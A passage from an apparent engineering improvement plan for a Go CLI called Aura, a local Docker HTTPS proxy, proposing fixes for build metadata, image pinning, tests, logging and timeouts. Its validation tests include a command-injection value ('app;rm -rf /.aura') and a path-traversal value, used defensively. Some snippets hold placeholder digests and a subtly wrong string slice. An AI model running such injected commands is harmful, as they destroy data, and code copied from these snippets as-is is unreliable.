        echo "- ShellCheck: ${{ needs.shellcheck.result }}"
        echo "- Security: ${{ needs.security.result }}"
        echo "- Docker Test: ${{ needs.docker-test.result }}"
        echo "- Docs Check: ${{ needs.docs-check.result }}"

        if [ "${{ needs.test.result }}" != "success" ] || \
           [ "${{ needs.lint.result }}" != "success" ] || \
           [ "${{ needs.build.result }}" != "success" ] || \
           [ "${{ needs.shellcheck.result }}" != "success" ] || \
           [ "${{ needs.security.result }}" != "success" ]; then
          echo "❌ CI pipeline failed"
          exit 1
        else
          echo "✅ CI pipeline passed"
        fi
```

**Acceptance Criteria:**
- [ ] ShellCheck failures block PRs
- [ ] gosec security issues block PRs
- [ ] Broken documentation links block PRs
- [ ] CI summary includes all checks
- [ ] SARIF files still uploaded for analysis
- [ ] Clear error messages when checks fail

**Testing:**
```bash
# Introduce a shellcheck issue
echo 'eval "dangerous"' >> setup.sh
git commit -am "test: trigger shellcheck"
git push

# CI should fail

# Introduce a security issue
# Add G204: Subprocess launched with variable
git commit -am "test: trigger gosec"
git push

# CI should fail
```

---

### 🟠 HIGH-006: No Version/Build Info in Binary

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Debugging, troubleshooting, support
**Location:** `Makefile:7`, build process

**Problem:**
Binary has no build metadata:
- Git commit SHA
- Build date
- Go version used
- Build platform

Makes debugging production issues difficult.

**Solution:**
Use `-ldflags` to inject build information.

**Implementation:**

1. Update `pkg/version/version.go`:
```go
package version

// Version is the current version of Aura, managed by semantic-release
var (
    Version   = "dev"
    GitCommit = "unknown"
    BuildDate = "unknown"
    GoVersion = "unknown"
    Platform  = "unknown"
)

// FullVersion returns a detailed version string
func FullVersion() string {
    return fmt.Sprintf("%s (commit: %s, built: %s, go: %s, platform: %s)",
        Version, GitCommit, BuildDate, GoVersion, Platform)
}
```

2. Update `Makefile`:
```makefile
.PHONY: build install uninstall clean test version

BINARY_NAME=aura
INSTALL_PATH=/usr/local/bin

# Build variables
VERSION=$(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
GIT_COMMIT=$(shell git rev-parse --short HEAD 2>/dev/null || echo "unknown")
BUILD_DATE=$(shell date -u +"%Y-%m-%dT%H:%M:%SZ")
GO_VERSION=$(shell go version | awk '{print $$3}')
PLATFORM=$(shell go env GOOS)/$(shell go env GOARCH)

# Linker flags
LDFLAGS=-ldflags "\
	-X 'github.com/ivannovak/aura/pkg/version.Version=$(VERSION)' \
	-X 'github.com/ivannovak/aura/pkg/version.GitCommit=$(GIT_COMMIT)' \
	-X 'github.com/ivannovak/aura/pkg/version.BuildDate=$(BUILD_DATE)' \
	-X 'github.com/ivannovak/aura/pkg/version.GoVersion=$(GO_VERSION)' \
	-X 'github.com/ivannovak/aura/pkg/version.Platform=$(PLATFORM)' \
	-s -w"

build:
	@echo "Building Aura CLI..."
	@echo "  Version:    $(VERSION)"
	@echo "  Commit:     $(GIT_COMMIT)"
	@echo "  Build Date: $(BUILD_DATE)"
	@echo "  Go Version: $(GO_VERSION)"
	@echo "  Platform:   $(PLATFORM)"
	@go build $(LDFLAGS) -o $(BINARY_NAME) ./cmd/aura

install: build
	@echo "Installing Aura CLI to $(INSTALL_PATH)..."
	@sudo cp $(BINARY_NAME) $(INSTALL_PATH)/
	@sudo chmod +x $(INSTALL_PATH)/$(BINARY_NAME)
	@echo "✅ Aura CLI installed successfully!"
	@echo "Run 'aura version' to verify installation"

uninstall:
	@echo "Uninstalling Aura CLI..."
	@sudo rm -f $(INSTALL_PATH)/$(BINARY_NAME)
	@echo "✅ Aura CLI uninstalled"

clean:
	@rm -f $(BINARY_NAME)
	@go clean

test:
	@go test -v ./...

version:
	@echo "Version:    $(VERSION)"
	@echo "Commit:     $(GIT_COMMIT)"
	@echo "Build Date: $(BUILD_DATE)"
	@echo "Go Version: $(GO_VERSION)"
	@echo "Platform:   $(PLATFORM)"

dev: build
	@./$(BINARY_NAME) $(ARGS)
```

3. Add `version` subcommand to `cmd/aura/main.go`:
```go
var versionCmd = &cobra.Command{
    Use:   "version",
    Short: "Show version information",
    Run: func(cmd *cobra.Command, args []string) {
        verbose, _ := cmd.Flags().GetBool("verbose")

        if verbose {
            fmt.Printf("Aura v%s\n", version.Version)
            fmt.Printf("  Git Commit: %s\n", version.GitCommit)
            fmt.Printf("  Build Date: %s\n", version.BuildDate)
            fmt.Printf("  Go Version: %s\n", version.GoVersion)
            fmt.Printf("  Platform:   %s\n", version.Platform)
        } else {
            fmt.Printf("aura version %s\n", version.Version)
        }
    },
}

func init() {
    rootCmd.AddCommand(installCmd)
    rootCmd.AddCommand(startCmd)
    rootCmd.AddCommand(stopCmd)
    rootCmd.AddCommand(certCmd)
    rootCmd.AddCommand(statusCmd)
    rootCmd.AddCommand(logsCmd)
    rootCmd.AddCommand(uninstallCmd)
    rootCmd.AddCommand(versionCmd)  // Add this

    logsCmd.Flags().BoolP("follow", "f", false, "Follow log output")
    versionCmd.Flags().BoolP("verbose", "v", false, "Show detailed version information")

    rootCmd.Version = version.Version
}
```

4. Update `.github/workflows/ci.yml` and `release.yml` to use build flags:
```yaml
- name: Build binary
  run: make build

- name: Test binary
  run: |
    ./aura --version
    ./aura version --verbose
```

**Acceptance Criteria:**
- [ ] Version from git tag or "dev"
- [ ] Git commit SHA included
- [ ] Build date in ISO8601 format
- [ ] Go version included
- [ ] Platform (OS/arch) included
- [ ] `aura --version` shows basic version
- [ ] `aura version --verbose` shows full details
- [ ] Binary size optimized with `-s -w`

**Testing:**
```bash
make build
./aura --version
./aura version --verbose

# Should show:
# Aura v1.0.0
#   Git Commit: 81f683a
#   Build Date: 2025-01-20T15:30:45Z
#   Go Version: go1.23.5
#   Platform:   darwin/arm64
```

---

### 🟠 HIGH-007: Docker Image Versions Not Pinned

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Reproducibility, stability, security
**Location:** `docker-compose.yml:5,42`

**Problem:**
Using `latest` and CI tags breaks reproducibility and could pull breaking changes.

**Current Configuration:**
```yaml
image: lucaslorentz/caddy-docker-proxy:ci-alpine
image: coredns/coredns:latest
```

**Solution:**
Pin specific stable versions with digest hashes for maximum reproducibility.

**Implementation:**

1. Research current stable versions:
```bash
# Find Caddy Docker Proxy latest stable
docker pull lucaslorentz/caddy-docker-proxy:2.8.4-alpine
docker inspect lucaslorentz/caddy-docker-proxy:2.8.4-alpine | grep -A5 RepoDigests

# Find CoreDNS latest stable
docker pull coredns/coredns:1.11.1
docker inspect coredns/coredns:1.11.1 | grep -A5 RepoDigests
```

2. Update `docker-compose.yml`:
```yaml
version: '3.8'

services:
  caddy:
    # Pin to specific stable version with digest
    # Version: 2.8.4 (as of 2025-01-20)
    # Update this periodically or use Dependabot
    image: lucaslorentz/caddy-docker-proxy:2.8.4-alpine@sha256:abc123...
    container_name: aura-caddy
    restart: unless-stopped
    ports:
      # Use custom loopback address 127.0.0.2
      - "127.0.0.2:80:80"
      - "127.0.0.2:443:443"
      - "127.0.0.2:443:443/udp" # HTTP/3
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./certs:/certs:ro
      - caddy_data:/data
      - caddy_config:/config
    networks:
      - aura-proxy
    environment:
      - CADDY_INGRESS_NETWORKS=aura-proxy
    labels:
      caddy: ""

  whoami:
    # Pin to specific version
    image: traefik/whoami:v1.10.1@sha256:def456...
    container_name: aura-whoami
    restart: unless-stopped
    networks:
      - aura-proxy
    environment:
      - WHOAMI_PORT_NUMBER=80
      - WHOAMI_NAME=Aura-WhoAmI
    labels:
      caddy: whoami.aura
      caddy.reverse_proxy: "{{upstreams 80}}"
      caddy.tls: "/certs/domains/whoami/cert.pem /certs/domains/whoami/key.pem"
      caddy.header.X-Served-By: "Aura Proxy"
      caddy.encode: gzip

  coredns:
    # Pin to specific stable version with digest
    # Version: 1.11.1 (as of 2025-01-20)
    image: coredns/coredns:1.11.1@sha256:ghi789...
    container_name: aura-coredns
    restart: unless-stopped
    command: -conf /config/Corefile
    ports:
      # Bind DNS server to custom loopback address 127.0.0.2
      - "127.0.0.2:53:53/udp"
      - "127.0.0.2:53:53/tcp"
    volumes:
      - ./coredns:/config:ro
    networks:
      - aura-proxy

volumes:
  caddy_data:
    name: aura_caddy_data
  caddy_config:
    name: aura_caddy_config

networks:
  aura-proxy:
    name: aura-proxy
    driver: bridge
```

3. Document version update process in `docs/ADVANCED.md`:
```markdown
## Updating Docker Images

Aura pins Docker image versions for reproducibility and stability. To update:

### Check for Updates

```bash
# Check current versions
docker compose -f ~/.aura/docker-compose.yml config --images

# Check for newer versions
docker search lucaslorentz/caddy-docker-proxy
docker search coredns/coredns
```

### Update Process

1. **Pull new version:**
   ```bash
   docker pull lucaslorentz/caddy-docker-proxy:2.9.0-alpine
   ```

2. **Get digest hash:**
   ```bash
   docker inspect lucaslorentz/caddy-docker-proxy:2.9.0-alpine | \
     grep -A2 RepoDigests | grep sha256
   ```

3. **Update docker-compose.yml:**
   ```yaml
   image: lucaslorentz/caddy-docker-proxy:2.9.0-alpine@sha256:newhash
   ```

4. **Test thoroughly:**
   ```bash
   aura stop
   docker compose -f ~/.aura/docker-compose.yml pull
   aura start
   # Test services
   curl https://whoami.aura
   ```

5. **Commit and document:**
   ```bash
   git commit -am "chore: update Caddy to v2.9.0"
   ```

### Security Updates

For critical security updates, follow the same process but test immediately:
```bash
aura stop
docker compose pull
aura start
aura status
```
```

4. Add Dependabot configuration `.github/dependabot.yml`:
```yaml
version: 2
updates:
  # Go modules
  - package-ecosystem: "gomod"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5

  # npm (semantic-release)
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5

  # Docker images
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5

  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5
```

**Acceptance Criteria:**
- [ ] All images pinned to specific versions
- [ ] Digest hashes included for reproducibility
- [ ] Comments explain version choices
- [ ] Documentation for update process
- [ ] Dependabot configured for automated updates
- [ ] Test that pinned versions work correctly

**Testing:**
```bash
# Pull with pinned versions
docker compose -f ~/.aura/docker-compose.yml pull

# Verify exact versions
docker compose -f ~/.aura/docker-compose.yml config --images

# Test functionality
aura start
curl https://whoami.aura
dig whoami.aura
```

---

### 🟠 HIGH-008: Docker Compose Version Field Deprecated

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Deprecation warnings, future compatibility
**Location:** `docker-compose.yml:1`

**Problem:**
Version field deprecated since Docker Compose v2.

**Current:**
```yaml
version: '3.8'
```

**Solution:**
Remove version field entirely.

**Implementation:**

Update `docker-compose.yml` and `docker-compose.example.yml`:
```yaml
# Remove: version: '3.8'

services:
  caddy:
    image: lucaslorentz/caddy-docker-proxy:2.8.4-alpine
    # ...
```

**Acceptance Criteria:**
- [ ] Remove version field from docker-compose.yml
- [ ] Remove version field from docker-compose.example.yml
- [ ] Verify compose files still work
- [ ] No deprecation warnings

**Testing:**
```bash
docker compose -f docker-compose.yml config
# Should not show deprecation warning
```

---

### 🟠 HIGH-009: Glob Pattern Assumptions in Scripts

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Silent failures if mkcert changes output
**Location:** `add-cert.sh:64-70`, `setup.sh:64-70`

**Problem:**
Scripts assume mkcert outputs exactly 2 files with specific naming patterns.

**Current Code:**
```bash
for file in *.pem; do
    if [[ "$file" == *-key.pem ]]; then
        mv "$file" "key.pem"
    else
        mv "$file" "cert.pem"
    fi
done
```

**Solution:**
Explicit file handling with verification.

**Implementation:**

Update `add-cert.sh`:
```bash
# Generate certificate with wildcard for subdomains
echo "Generating certificate with mkcert..."
mkcert "$DOMAIN" "*.$DOMAIN" localhost 127.0.0.1 127.0.0.2 ::1

# Find generated files explicitly
CERT_FILE=""
KEY_FILE=""

for file in *.pem; do
    if [[ "$file" == *"-key.pem" ]]; then
        KEY_FILE="$file"
    else
        CERT_FILE="$file"
    fi
done

# Verify we found both files
if [[ -z "$CERT_FILE" ]]; then
    echo "Error: Certificate file not found after mkcert generation"
    ls -la
    exit 1
fi

if [[ -z "$KEY_FILE" ]]; then
    echo "Error: Private key file not found after mkcert generation"
    ls -la
    exit 1
fi

# Rename to standard names
echo "Renaming certificate files..."
mv "$CERT_FILE" "cert.pem"
mv "$KEY_FILE" "key.pem"

# Verify final files exist
if [[ ! -f "cert.pem" ]] || [[ ! -f "key.pem" ]]; then
    echo "Error: Failed to create cert.pem or key.pem"
    ls -la
    exit 1
fi

echo "✓ Certificate files created successfully"
chmod 600 cert.pem key.pem
```

Update `setup.sh` similarly for the whoami certificate section.

**Acceptance Criteria:**
- [ ] Explicit file finding logic
- [ ] Verify both files found before renaming
- [ ] Error messages if files missing
- [ ] File permissions set explicitly
- [ ] Works with current mkcert version
- [ ] Robust against future mkcert changes

**Testing:**
```bash
# Test normal case
cd /tmp/test-cert
~/.aura/add-cert.sh test.aura

# Should create cert.pem and key.pem

# Test error case (manually delete a file mid-process)
# Should error clearly
```

---

## Medium Priority Issues

### 🟡 MED-001: Minimal Test Coverage

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** Code quality, maintainability, confidence in changes
**Location:** `cmd/aura/main_test.go`

**Problem:**
Test coverage is approximately 30%. Missing:
- Integration tests
- Error path testing
- copyConfigs test (skipped at line 158)
- Command execution tests
- Platform-specific tests

**Solution:**
Expand test suite with integration tests and error cases.

**Implementation:**

Create comprehensive test structure:

```
cmd/aura/
├── main.go
├── main_test.go
├── integration_test.go
├── testdata/
│   ├── valid-domain.aura
│   ├── invalid-domain.txt
│   └── test-compose.yml
```

1. Add integration tests in `cmd/aura/integration_test.go`:
```go
//go:build integration
// +build integration

package main

import (
    "os"
    "path/filepath"
    "testing"
)

func TestInstallCommand(t *testing.T) {
    // Create temporary directory for test
    tmpDir := t.TempDir()
    oldAuraDir := auraDir
    auraDir = filepath.Join(tmpDir, ".aura")
    defer func() { auraDir = oldAuraDir }()

    // Run install command
    err := installCmd.RunE(nil, []string{})
    if err != nil {
        t.Fatalf("install failed: %v", err)
    }

    // Verify directory created
    if _, err := os.Stat(auraDir); os.IsNotExist(err) {
        t.Error("aura directory not created")
    }

    // Verify files copied
    expectedFiles := []string{
        "docker-compose.yml",
        "setup.sh",
        "add-cert.sh",
    }

    for _, file := range expectedFiles {
        path := filepath.Join(auraDir, file)
        if _, err := os.Stat(path); os.IsNotExist(err) {
            t.Errorf("expected file not found: %s", file)
        }
    }
}

func TestCopyConfigs(t *testing.T) {
    // Create temporary directory
    tmpDir := t.TempDir()
    oldAuraDir := auraDir
    auraDir = tmpDir
    defer func() { auraDir = oldAuraDir }()

    // Run copyConfigs
    err := copyConfigs()
    if err != nil {
        t.Fatalf("copyConfigs failed: %v", err)
    }

    // Verify structure
    dirs := []string{
        filepath.Join(auraDir, "certs", "domains"),
        filepath.Join(auraDir, "coredns"),
    }

    for _, dir := range dirs {
        if _, err := os.Stat(dir); os.IsNotExist(err) {
            t.Errorf("expected directory not created: %s", dir)
        }
    }
}
```

2. Add error path tests in `cmd/aura/main_test.go`:
```go
func TestValidateDomainErrors(t *testing.T) {
    tests := []struct {
        name        string
        domain      string
        shouldError bool
        errorMsg    string
    }{
        {
            name:        "path traversal",
            domain:      "../../../etc/passwd.aura",
            shouldError: true,
            errorMsg:    "path traversal",
        },
        {
            name:        "empty domain",
            domain:      ".aura",
            shouldError: true,
            errorMsg:    "empty",
        },
        {
            name:        "too long",
            domain:      strings.Repeat("a", 250) + ".aura",
            shouldError: true,
            errorMsg:    "too long",
        },
        {
            name:        "invalid characters",
            domain:      "app;rm -rf /.aura",
            shouldError: true,
            errorMsg:    "invalid",
        },
        {
            name:        "valid simple",
            domain:      "app.aura",
            shouldError: false,
        },
        {
            name:        "valid subdomain",
            domain:      "api.app.aura",
            shouldError: false,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            err := validateDomain(tt.domain)

            if tt.shouldError {
                if err == nil {
                    t.Errorf("expected error containing %q, got nil", tt.errorMsg)
                } else if !strings.Contains(err.Error(), tt.errorMsg) {
                    t.Errorf("expected error containing %q, got %q", tt.errorMsg, err.Error())
                }
            } else {
                if err != nil {
                    t.Errorf("expected no error, got %v", err)
                }
            }
        })
    }
}

func TestRunCommandErrors(t *testing.T) {
    tests := []struct {
        name    string
        command string
        args    []string
        wantErr bool
    }{
        {
            name:    "nonexistent command",
            command: "this-command-does-not-exist",
            args:    []string{},
            wantErr: true,
        },
        {
            name:    "command with error exit",
            command: "sh",
            args:    []string{"-c", "exit 1"},
            wantErr: true,
        },
        {
            name:    "valid command",
            command: "echo",
            args:    []string{"test"},
            wantErr: false,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            err := runCommand(tt.command, tt.args...)
            if (err != nil) != tt.wantErr {
                t.Errorf("runCommand() error = %v, wantErr %v", err, tt.wantErr)
            }
        })
    }
}
```

3. Update `Makefile` to support integration tests:
```makefile
test:
	@go test -v ./...

test-integration:
	@go test -v -tags=integration ./...

test-coverage:
	@go test -v -coverprofile=coverage.out ./...
	@go tool cover -html=coverage.out -o coverage.html
	@echo "Coverage report: coverage.html"

test-all: test test-integration test-coverage
```

4. Update `.github/workflows/ci.yml`:
```yaml
- name: Run tests
  run: go test -v -race -coverprofile=coverage.txt -covermode=atomic ./...

- name: Run integration tests
  run: go test -v -race -tags=integration ./...
```

**Acceptance Criteria:**
- [ ] Unit test coverage >70%
- [ ] Integration tests for main commands
- [ ] Error path tests for all functions
- [ ] copyConfigs test implemented
- [ ] Domain validation tests comprehensive
- [ ] CI runs all test types
- [ ] Coverage report generated

**Testing:**
```bash
make test              # Unit tests
make test-integration  # Integration tests
make test-coverage     # Generate coverage report
open coverage.html     # View coverage
```

---

### 🟡 MED-002: No Structured Logging

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** Debugging, observability, production support
**Location:** All `fmt.Println()` calls throughout codebase

**Problem:**
All output uses `fmt.Println()` with no:
- Log levels (debug, info, warn, error)
- Machine-readable logs
- Structured fields
- Context propagation
- Debug mode

**Solution:**
Introduce structured logging with `log/slog` (Go 1.21+) or `zerolog`.

**Implementation:**

1. Create `pkg/logger/logger.go`:
```go
package logger

import (
    "io"
    "log/slog"
    "os"
)

var (
    // Global logger instance
    Log *slog.Logger
)

// Level represents log level
type Level int

const (
    LevelDebug Level = iota
    LevelInfo
    LevelWarn
    LevelError
)

// Config for logger initialization
type Config struct {
    Level  Level
    Format string // "text" or "json"
    Output io.Writer
}

// Init initializes the global logger
func Init(cfg Config) {
    var level slog.Level
    switch cfg.Level {
    case LevelDebug:
        level = slog.LevelDebug
    case LevelInfo:
        level = slog.LevelInfo
    case LevelWarn:
        level = slog.LevelWarn
    case LevelError:
        level = slog.LevelError
    default:
        level = slog.LevelInfo
    }

    opts := &slog.HandlerOptions{
        Level: level,
    }

    var handler slog.Handler
    if cfg.Format == "json" {
        handler = slog.NewJSONHandler(cfg.Output, opts)
    } else {
        handler = slog.NewTextHandler(cfg.Output, opts)
    }

    Log = slog.New(handler)
}

// Initialize with defaults if not already initialized
func init() {
    if Log == nil {
        Init(Config{
            Level:  LevelInfo,
            Format: "text",
            Output: os.Stdout,
        })
    }
}

// Helper functions for common patterns
func Info(msg string, args ...any) {
    Log.Info(msg, args...)
}

func Debug(msg string, args ...any) {
    Log.Debug(msg, args...)
}

func Warn(msg string, args ...any) {
    Log.Warn(msg, args...)
}

func Error(msg string, args ...any) {
    Log.Error(msg, args...)
}

func Fatal(msg string, args ...any) {
    Log.Error(msg, args...)
    os.Exit(1)
}
```

2. Update `cmd/aura/main.go` to use structured logging:
```go
package main

import (
    // ...
    "github.com/ivannovak/aura/pkg/logger"
)

// Add global flags for logging
var (
    logLevel  string
    logFormat string
)

func init() {
    rootCmd.PersistentFlags().StringVar(&logLevel, "log-level", "info",
        "Log level (debug, info, warn, error)")
    rootCmd.PersistentFlags().StringVar(&logFormat, "log-format", "text",
        "Log format (text, json)")

    rootCmd.AddCommand(installCmd)
    // ... other commands
}

func main() {
    // Initialize logger before executing commands
    cobra.OnInitialize(initLogger)

    if err := rootCmd.Execute(); err != nil {
        logger.Error("Command failed", "error", err)
        os.Exit(1)
    }
}

func initLogger() {
    level := logger.LevelInfo
    switch logLevel {
    case "debug":
        level = logger.LevelDebug
    case "info":
        level = logger.LevelInfo
    case "warn":
        level = logger.LevelWarn
    case "error":
        level = logger.LevelError
    }

    logger.Init(logger.Config{
        Level:  level,
        Format: logFormat,
        Output: os.Stdout,
    })
}

// Update commands to use logger
var installCmd = &cobra.Command{
    Use:   "install",
    Short: "Install Aura proxy system",
    Long:  `Sets up the Aura proxy system including loopback address, mkcert, and Docker configuration.`,
    RunE: func(cmd *cobra.Command, args []string) error {
        logger.Info("Installing Aura proxy system")

        // Create .aura directory
        logger.Debug("Creating aura directory", "path", auraDir)
        if err := os.MkdirAll(auraDir, 0755); err != nil {
            return fmt.Errorf("failed to create aura directory: %w", err)
        }

        // Copy configuration files
        logger.Info("Copying configuration files")
        if err := copyConfigs(); err != nil {
            return fmt.Errorf("failed to copy configs: %w", err)
        }

        // Run setup script
        setupScript := filepath.Join(auraDir, "setup.sh")
        logger.Info("Running setup script", "script", setupScript)
        if err := runCommand("bash", setupScript); err != nil {
            return fmt.Errorf("setup failed: %w", err)
        }

        logger.Info("Aura proxy installed successfully!")
        fmt.Println("\nNext steps:")
        fmt.Println("  1. Start the proxy: aura start")
        fmt.Println("  2. Test it: open https://whoami.aura")
        return nil
    },
}

var statusCmd = &cobra.Command{
    Use:   "status",
    Short: "Show Aura proxy status",
    RunE: func(cmd *cobra.Command, args []string) error {
        logger.Info("Checking Aura proxy status")

        // Check if containers are running
        output, err := exec.Command("docker", "ps", "--filter", "name=aura-",
            "--format", "table {{.Names}}\t{{.Status}}").Output()
        if err != nil {
            logger.Warn("Failed to query Docker", "error", err)
            fmt.Println("❌ Aura proxy is not running")
            return nil
        }

        if len(output) > 0 {
            logger.Debug("Found running containers", "count", len(strings.Split(string(output), "\n")))
            fmt.Println("✅ Aura proxy is running")
            fmt.Println(string(output))
        } else {
            logger.Info("No Aura containers running")
            fmt.Println("❌ Aura proxy is not running")
            fmt.Println("   Start with: aura start")
        }
        return nil
    },
}
```

3. Update runCommand to support logging:
```go
func runCommand(name string, args ...string) error {
    logger.Debug("Executing command", "name", name, "args", args)

    cmd := exec.Command(name, args...)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Stdin = os.Stdin

    if err := cmd.Run(); err != nil {
        logger.Error("Command failed", "name", name, "args", args, "error", err)
        return err
    }

    logger.Debug("Command completed", "name", name)
    return nil
}
```

**Acceptance Criteria:**
- [ ] Structured logging library integrated
- [ ] Log levels: debug, info, warn, error
- [ ] --log-level flag on all commands
- [ ] --log-format flag (text/json)
- [ ] Replace fmt.Println with logger calls
- [ ] Contextual fields in log messages
- [ ] Debug mode shows command execution details
- [ ] JSON format for machine parsing

**Testing:**
```bash
# Info level (default)
aura install

# Debug level
aura --log-level=debug install

# JSON format
aura --log-format=json install

# JSON output should be parseable
aura --log-format=json status | jq .
```

---

### 🟡 MED-003: Hardcoded Magic Strings

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** Maintainability, refactoring safety
**Location:** Multiple places in `main.go`

**Problem:**
Container names and other strings hardcoded throughout code:
- `"aura-caddy"`
- `"aura-whoami"`
- `"aura-coredns"`
- `"aura-proxy"`
- `"127.0.0.2"`

**Solution:**
Define constants for all magic strings.

**Implementation:**

Update `cmd/aura/main.go`:
```go
package main

import (
    // ... imports
)

const (
    // Domain configuration
    auraTLD = ".aura"

    // Network configuration
    loopbackIP     = "127.0.0.2"
    loopbackPort80 = "80"
    loopbackPort443 = "443"
    dnsPort        = "53"

    // Container names
    containerCaddy   = "aura-caddy"
    containerWhoami  = "aura-whoami"
    containerCoredns = "aura-coredns"

    // Docker resources
    networkName     = "aura-proxy"
    volumeCaddyData = "aura_caddy_data"
    volumeCaddyConfig = "aura_caddy_config"

    // File permissions
    filePermScript   = 0600
    dirPermDefault   = 0755
    dirPermCerts     = 0755

    // Directories
    dirCerts         = "certs"
    dirCertsDomains  = "certs/domains"
    dirCoredns       = "coredns"
)

var (
    auraDir string

    // Configuration files to copy
    configFiles = []string{
        "docker-compose.yml",
        "docker-compose.example.yml",
        "setup.sh",
        "setup-loopback.sh",
        "setup-resolver.sh",
        "setup-mkcert.sh",
        "add-cert.sh",
        "uninstall-resolver.sh",
        "uninstall-loopback.sh",
    }

    // ... ANSI colors
)

// Update statusCmd to use constants
var statusCmd = &cobra.Command{
    Use:   "status",
    Short: "Show Aura proxy status",
    RunE: func(cmd *cobra.Command, args []string) error {
        logger.Info("Checking Aura proxy status")

        // Check if containers are running
        filter := fmt.Sprintf("name=%s", containerCaddy[:len(containerCaddy)-6]) // "aura-"
        output, err := exec.Command("docker", "ps", "--filter", filter,
            "--format", "table {{.Names}}\t{{.Status}}").Output()
        if err != nil {
            logger.Warn("Failed to query Docker", "error", err)
            fmt.Println("❌ Aura proxy is not running")
            return nil
        }

        if len(output) > 0 {
            fmt.Println("✅ Aura proxy is running")
            fmt.Println(string(output))
        } else {
            fmt.Println("❌ Aura proxy is not running")
            fmt.Println("   Start with: aura start")
        }
        return nil
    },
}

// Update logsCmd
var logsCmd = &cobra.Command{
    Use:   "logs",
    Short: "Show Aura proxy logs",
    RunE: func(cmd *cobra.Command, args []string) error {
        follow, _ := cmd.Flags().GetBool("follow")

        dockerArgs := []string{"logs"}
        if follow {
            dockerArgs = append(dockerArgs, "-f")
        }
        dockerArgs = append(dockerArgs, containerCaddy)

        return runCommand("docker", dockerArgs...)
    },
}

// Update uninstallCmd
var uninstallCmd = &cobra.Command{
    Use:   "uninstall",
    Short: "Uninstall Aura proxy system",
    RunE: func(cmd *cobra.Command, args []string) error {
        // ... confirmation logic ...

        // Remove Docker network
        logger.Info("Removing Docker network", "network", networkName)
        if err := runCommand("docker", "network", "rm", networkName); err != nil {
            logger.Debug("Network already removed", "network", networkName)
        }

        // Remove Docker volumes
        logger.Info("Removing Docker volumes")
        _ = runCommand("docker", "volume", "rm", volumeCaddyData)
        _ = runCommand("docker", "volume", "rm", volumeCaddyConfig)

        // ...
    },
}

// Update copyConfigs
func copyConfigs() error {
    for _, file := range configFiles {
        data, err := embeddedFS.ReadFile(file)
        if err != nil {
            return fmt.Errorf("failed to read embedded %s: %w", file, err)
        }

        dst := filepath.Join(auraDir, file)
        if err := os.WriteFile(dst, data, filePermScript); err != nil {
            return fmt.Errorf("failed to write %s: %w", file, err)
        }
    }

    // Create directories
    if err := os.MkdirAll(filepath.Join(auraDir, dirCertsDomains), dirPermCerts); err != nil {
        return fmt.Errorf("failed to create certs directory: %w", err)
    }
    if err := os.MkdirAll(filepath.Join(auraDir, dirCoredns), dirPermDefault); err != nil {
        return fmt.Errorf("failed to create coredns directory: %w", err)
    }

    // ... rest of function
}
```

**Acceptance Criteria:**
- [ ] All magic strings defined as constants
- [ ] Constants grouped logically
- [ ] No hardcoded strings in functions
- [ ] Easy to change configuration
- [ ] Comments explain constant purposes

**Testing:**
```bash
# All functionality should work identically
aura status
aura logs
```

---

### 🟡 MED-004: No Context Support in Command Execution

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** Cannot cancel operations, no timeouts
**Location:** `cmd/aura/main.go:225-240`

**Problem:**
`runCommand()` doesn't support context, preventing:
- Operation cancellation
- Timeouts
- Graceful shutdown
- Signal handling

**Solution:**
Add context-aware command execution with timeout support.

**Implementation:**

```go
import (
    "context"
    "time"
)

// runCommandWithTimeout executes a command with timeout
func runCommandWithTimeout(timeout time.Duration, name string, args ...string) error {
    ctx, cancel := context.WithTimeout(context.Background(), timeout)
    defer cancel()

    return runCommandWithContext(ctx, name, args...)
}

// runCommandWithContext executes a command with context
func runCommandWithContext(ctx context.Context, name string, args ...string) error {
    logger.Debug("Executing command with context",
        "name", name,
        "args", args,
        "timeout", ctx.Deadline())

    cmd := exec.CommandContext(ctx, name, args...)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Stdin = os.Stdin

    if err := cmd.Run(); err != nil {
        if ctx.Err() == context.DeadlineExceeded {
            logger.Error("Command timed out", "name", name, "args", args)
            return fmt.Errorf("command timed out: %w", err)
        }
        return err
    }

    return nil
}

// Keep original for backwards compatibility
func runCommand(name string, args ...string) error {
    return runCommandWithContext(context.Background(), name, args...)
}

// Update commands to use timeouts where appropriate
var installCmd = &cobra.Command{
    Use:   "install",
    Short: "Install Aura proxy system",
    RunE: func(cmd *cobra.Command, args []string) error {
        // ... setup ...

        // Run setup script with 5 minute timeout
        setupScript := filepath.Join(auraDir, "setup.sh")
        logger.Info("Running setup script (timeout: 5m)", "script", setupScript)
        if err := runCommandWithTimeout(5*time.Minute, "bash", setupScript); err != nil {
            return fmt.Errorf("setup failed: %w", err)
        }

        return nil
    },
}
```

**Acceptance Criteria:**
- [ ] Context-aware command execution
- [ ] Configurable timeouts
- [ ] Proper error handling for timeouts
- [ ] Signal handling (Ctrl+C)
- [ ] Backwards compatible

---

### 🟡 MED-005: Inconsistent Error Handling

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** User experience, debugging
**Location:** Throughout `cmd/aura/main.go`

**Problem:**
Some errors are well-wrapped, others just warnings. No consistent strategy.

**Solution:**
Define error handling guidelines and implement consistently.

**Implementation:**

1. Create error types in `pkg/errors/errors.go`:
```go
package errors

import (
    "fmt"
)

// Error codes
const (
    ErrCodeGeneral = iota
    ErrCodeConfiguration
